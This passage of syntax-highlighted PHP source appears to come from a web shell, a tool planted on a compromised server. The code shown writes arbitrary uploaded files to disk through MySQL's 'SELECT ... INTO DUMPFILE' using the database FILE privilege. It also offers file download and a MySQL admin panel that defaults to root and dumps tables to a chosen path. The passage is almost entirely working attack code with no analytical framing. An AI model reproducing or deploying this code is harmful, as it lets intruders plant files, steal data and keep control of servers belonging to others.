<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'The goal file has already existed'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!$<span style="color: #eeeeec;">filename</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Please choose a file'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">filename</span>,<span style="color: #ad7fa8; font-style: italic;">'r'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">contents</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fread(</span>$<span style="color: #eeeeec;">fp</span>, <span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">filename</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">contents</span> = <span style="color: #eeeeec; background-color: #2e3436;">bin2hex(</span>$<span style="color: #eeeeec;">contents</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!$<span style="color: #eeeeec;">upname</span>) $<span style="color: #eeeeec;">upname</span> = $<span style="color: #eeeeec;">file</span>[<span style="color: #ad7fa8; font-style: italic;">'name'</span>];
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>,$<span style="color: #eeeeec;">dbuser</span>,$<span style="color: #eeeeec;">dbpass</span>,$<span style="color: #eeeeec;">dbname</span>,$<span style="color: #eeeeec;">charset</span>,$<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">result</span> = <span style="color: #eeeeec; background-color: #2e3436;">q(</span><span style="color: #ad7fa8; font-style: italic;">"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span>$<span style="color: #eeeeec;">result</span> ? <span style="color: #ad7fa8; font-style: italic;">'Upload success'</span> : <span style="color: #ad7fa8; font-style: italic;">'Upload has failed: '</span>.<span style="color: #eeeeec; background-color: #2e3436;">mysql_error(</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="color: #729fcf;">?&gt;</span>
<span style="color: #8ae234;">&lt;script</span> <span style="color: #8ae234;">type=</span><span style="color: #ad7fa8; font-style: italic;">"text/javascript"</span><span style="color: #8ae234;">&gt;</span>
<span style="color: #729fcf; font-weight: bold;">function</span> <span style="color: #edd400; font-weight: bold; font-style: italic;">mysqlfile</span>(<span style="color: #f57900; font-weight: bold;">doing</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(!<span style="color: #f57900; font-weight: bold;">doing</span>) <span style="color: #729fcf; font-weight: bold;">return</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'doing'</span>).<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #f57900; font-weight: bold;">doing</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'mysqlfile'</span>).<span style="color: #f57900; font-weight: bold;">dbhost</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'dbinfo'</span>).<span style="color: #f57900; font-weight: bold;">dbhost</span>.<span style="color: #f57900; font-weight: bold;">value</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'mysqlfile'</span>).<span style="color: #f57900; font-weight: bold;">dbport</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'dbinfo'</span>).<span style="color: #f57900; font-weight: bold;">dbport</span>.<span style="color: #f57900; font-weight: bold;">value</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'mysqlfile'</span>).<span style="color: #f57900; font-weight: bold;">dbuser</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'dbinfo'</span>).<span style="color: #f57900; font-weight: bold;">dbuser</span>.<span style="color: #f57900; font-weight: bold;">value</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'mysqlfile'</span>).<span style="color: #f57900; font-weight: bold;">dbpass</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'dbinfo'</span>).<span style="color: #f57900; font-weight: bold;">dbpass</span>.<span style="color: #f57900; font-weight: bold;">value</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'mysqlfile'</span>).<span style="color: #f57900; font-weight: bold;">dbname</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'dbinfo'</span>).<span style="color: #f57900; font-weight: bold;">dbname</span>.<span style="color: #f57900; font-weight: bold;">value</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'mysqlfile'</span>).<span style="color: #f57900; font-weight: bold;">charset</span>.<span style="color: #f57900; font-weight: bold;">value</span>=<span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'dbinfo'</span>).<span style="color: #f57900; font-weight: bold;">charset</span>.<span style="color: #f57900; font-weight: bold;">value</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">$(</span><span style="color: #ad7fa8; font-style: italic;">'mysqlfile'</span>).<span style="color: #eeeeec; background-color: #2e3436;">submit(</span>);
}
<span style="color: #8ae234;">&lt;/script&gt;</span>
<span style="color: #729fcf;">&lt;?php</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">dbhost</span> &amp;&amp; $<span style="color: #eeeeec;">dbhost</span> = <span style="color: #ad7fa8; font-style: italic;">'localhost'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">dbuser</span> &amp;&amp; $<span style="color: #eeeeec;">dbuser</span> = <span style="color: #ad7fa8; font-style: italic;">'root'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">dbport</span> &amp;&amp; $<span style="color: #eeeeec;">dbport</span> = <span style="color: #ad7fa8; font-style: italic;">'3306'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=<span style="color: #8ae234;">&gt;</span><span style="color: #ad7fa8; font-style: italic;">'MYSQL Information'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbinfo'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'sqlfile'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBHost:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbhost'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">20</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbhost</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">':'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbport'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">4</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbport</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBUser:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbuser'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">15</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbuser</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBPass:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbpass'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">15</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbpass</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBName:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'dbname'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">15</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">dbname</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'DBCharset:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeselect(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'charset'</span>,<span style="color: #ad7fa8; font-style: italic;">'option'</span>=&gt;$<span style="color: #eeeeec;">charsetdb</span>,<span style="color: #ad7fa8; font-style: italic;">'selected'</span>=&gt;$<span style="color: #eeeeec;">charset</span>,<span style="color: #ad7fa8; font-style: italic;">'nokey'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;form action="'</span>.$<span style="color: #eeeeec;">self</span>.<span style="color: #ad7fa8; font-style: italic;">'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;Upload file&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" type="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;Download file&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dbhost'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dbport'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dbuser'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dbpass'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dbname'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'charset'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'doing'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'sqlfile'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/form&gt;'</span>);
}

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'mysqladmin'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">dbhost</span> &amp;&amp; $<span style="color: #eeeeec;">dbhost</span> = <span style="color: #ad7fa8; font-style: italic;">'localhost'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">dbuser</span> &amp;&amp; $<span style="color: #eeeeec;">dbuser</span> = <span style="color: #ad7fa8; font-style: italic;">'root'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">dbport</span> &amp;&amp; $<span style="color: #eeeeec;">dbport</span> = <span style="color: #ad7fa8; font-style: italic;">'3306'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbform</span> = <span style="color: #ad7fa8; font-style: italic;">'&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">dbhost</span>)){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbform</span> .= <span style="color: #ad7fa8; font-style: italic;">"&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" /&gt;\n"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">dbuser</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbform</span> .= <span style="color: #ad7fa8; font-style: italic;">"&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" /&gt;\n"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">dbpass</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbform</span> .= <span style="color: #ad7fa8; font-style: italic;">"&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" /&gt;\n"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">dbport</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbform</span> .= <span style="color: #ad7fa8; font-style: italic;">"&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" /&gt;\n"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">dbname</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbform</span> .= <span style="color: #ad7fa8; font-style: italic;">"&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" /&gt;\n"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">isset(</span>$<span style="color: #eeeeec;">charset</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">dbform</span> .= <span style="color: #ad7fa8; font-style: italic;">"&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" /&gt;\n"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">doing</span> == <span style="color: #ad7fa8; font-style: italic;">'backupmysql'</span> &amp;&amp; $<span style="color: #eeeeec;">saveasfile</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!$<span style="color: #eeeeec;">table</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">'Please choose the table'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">mysqllink</span> = <span style="color: #eeeeec; background-color: #2e3436;">mydbconn(</span>$<span style="color: #eeeeec;">dbhost</span>,$<span style="color: #eeeeec;">dbuser</span>,$<span style="color: #eeeeec;">dbpass</span>,$<span style="color: #eeeeec;">dbname</span>,$<span style="color: #eeeeec;">charset</span>,$<span style="color: #eeeeec;">dbport</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span> = @<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">path</span>,<span style="color: #ad7fa8; font-style: italic;">'w'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">fp</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>($<span style="color: #eeeeec;">table</span> <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">k</span> =&gt; $<span style="color: #eeeeec;">v</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">v</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">sqldumptable(</span>$<span style="color: #eeeeec;">v</span>, $<span style="color: #eeeeec;">fp</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
